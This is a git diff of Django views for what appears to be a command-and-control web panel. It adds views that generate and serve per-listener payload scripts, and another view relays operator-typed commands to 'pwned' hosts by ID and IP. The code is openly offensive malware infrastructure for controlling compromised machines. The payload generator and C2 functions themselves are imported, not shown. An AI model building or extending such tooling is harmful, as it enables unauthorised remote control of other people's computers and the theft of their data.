@@ -1,16 +1,17 @@
 from django.contrib import messages
-from django.http import HttpResponse, Http404, HttpResponseRedirect
-from django.shortcuts import render, get_object_or_404, redirect
-from django.utils import timezone
-from .models import Listener, pwnedHost
-from .forms import ListenerForm
 from django.contrib.auth.decorators import login_required
+from django.http import Http404, HttpResponseRedirect
+from django.shortcuts import render, get_object_or_404, redirect
+from .models import Listener
+from .forms import ListenerForm
 from django.views.decorators.cache import never_cache
 from django.views.decorators.clickjacking import *
 from django.http import HttpResponse
 from django.views.decorators.csrf import csrf_exempt
 from c2 import *
+import generate_payload
 import threading
+from multiprocessing import Process
 
 
 @xframe_options_deny
@@ -42,7 +43,6 @@ def listener_replay(request, pk):
         listener = get_object_or_404(Listener, pk=pk)
     except:
         raise Http404
-
     create_socket(listener.author, listener.interface, listener.port)
     sock_connect()
     return render(request, 'listener_list.html', {'listeners': listeners})
@@ -103,6 +103,27 @@ def listener_edit(request, pk):
 @xframe_options_deny
 @never_cache
 @login_required
+def payload_create(request, pk):
+    try:
+        listener = get_object_or_404(Listener, pk=pk)
+    except:
+        raise Http404
+    generate_payload.gen_payload(listener.id, listener.port)
+    listeners = Listener.objects.filter()
+    return render(request, 'listener_list.html', {'listeners': listeners})
+
+
+@xframe_options_deny
+@never_cache
+@login_required
+def payload_download(request, pk):
+    listener = get_object_or_404(Listener, pk=pk)
+    return HttpResponseRedirect('static/payloads/listener-%d.py' % listener.id)
+
+
+@xframe_options_deny
+@never_cache
+@login_required
 def listener_delete(request, pk):
     try:
         listener = get_object_or_404(Listener, pk=pk)
@@ -142,7 +163,7 @@ def result(request, pk):
         raise Http404
 
     param = request.POST.get('command')
-    output = command_control(param, pwnedhost.ip)
+    output = command_control(param, pwnedhost.id, pwnedhost.ip)
     return HttpResponse(output)
 
 
